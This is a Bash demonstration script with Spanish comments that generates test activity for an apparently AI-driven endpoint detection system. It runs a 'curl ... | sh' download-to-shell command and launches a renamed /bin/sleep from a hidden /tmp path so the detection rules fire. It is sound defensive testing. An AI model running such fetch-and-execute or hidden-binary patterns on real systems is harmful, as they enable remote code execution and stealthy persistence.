#!/usr/bin/env bash
# Genera la actividad de la demostración: primero tráfico corriente, luego dos
# comportamientos que el triaje debe escalar.
#
#   Terminal 1:  sudo EDR_MODE=autonomous venv/bin/python3 orchestrator.py
#   Terminal 2:  bash scripts/demo_detection.sh
#
# Nada de lo que hace es dañino. La "amenaza" es /bin/sleep copiado con otro
# nombre: sirve porque el sistema decide a partir de CÓMO se ejecuta un proceso
# —desde dónde, con qué nombre, con qué argumentos— y no de lo que el binario
# haga por dentro. Eso permite enseñar la cadena completa sin ejecutar malware.

set -u

DECOY=/tmp/.systemd-update

titulo() { printf '\n\033[1m== %s ==\033[0m\n' "$1"; }
paso()   { printf '  $ %s\n' "$1"; }

titulo "1. Actividad corriente (no debe escalar)"

paso "curl -s https://api.github.com/health"
curl -s --max-time 5 https://api.github.com/health >/dev/null 2>&1

paso "curl -s http://127.0.0.1:11434/api/tags   (el propio Ollama)"
curl -s --max-time 5 http://127.0.0.1:11434/api/tags >/dev/null 2>&1

paso "grep -r edr --include=*.py ."
grep -r edr --include='*.py' . >/dev/null 2>&1

echo "  → ninguna regla disparada: el modelo ni se entera de que esto ha pasado"

titulo "2. Descarga tubada a un shell (downloader_to_shell)"

# 1.1.1.1 es el resolutor público de Cloudflare: una IP realmente encaminable,
# que es lo que la regla exige. Las de documentación (198.51.100.x) no valen,
# porque `is_global` las excluye igual que loopback o las redes privadas.
paso "bash -c 'curl -s http://1.1.1.1/x.sh | sh'"
bash -c "curl -s --max-time 3 http://1.1.1.1/x.sh | sh" >/dev/null 2>&1

echo "  → antes de esta fase, este evento era indistinguible del curl de arriba"

titulo "3. Proceso de vida larga desde /tmp con nombre oculto"

paso "cp /bin/sleep $DECOY && $DECOY 600 &"
cp /bin/sleep "$DECOY"
"$DECOY" 600 &
DECOY_PID=$!

# Comprobación explícita: en la primera ejecución la variable se llamaba SEÑUELO,
# bash no admite identificadores no ASCII y trató la asignación como una ORDEN a
# ejecutar. El señuelo no arrancó nunca y el fallo pasó inadvertido hasta revisar
# la telemetría, donde aparecía un evento con filename="SEÑUELO=/tmp/...".
sleep 0.2
if ! kill -0 "$DECOY_PID" 2>/dev/null; then
    echo "  [!] el señuelo no arrancó: sin él no hay proceso de vida larga que remediar"
    exit 1
fi

echo "  → PID $DECOY_PID, severidad 70 (exec_from_world_writable + hidden_binary)"
echo "  → sigue vivo mientras el modelo razona: es el caso que la fase 3a desbloqueó"

titulo "Comprobación"
cat <<EOF
  Mira el orquestador. Cuando termine el ciclo:

    ps -o pid,stat,comm -p $DECOY_PID

  STAT = T  -> congelado (SIGSTOP), la remediación se ejecutó
  sin salida -> terminado (SIGKILL)
  STAT = S  -> sigue vivo: o el modelo dijo NOTHING, o una salvaguarda lo denegó

  Para limpiar:  kill $DECOY_PID 2>/dev/null; rm -f $DECOY
EOF
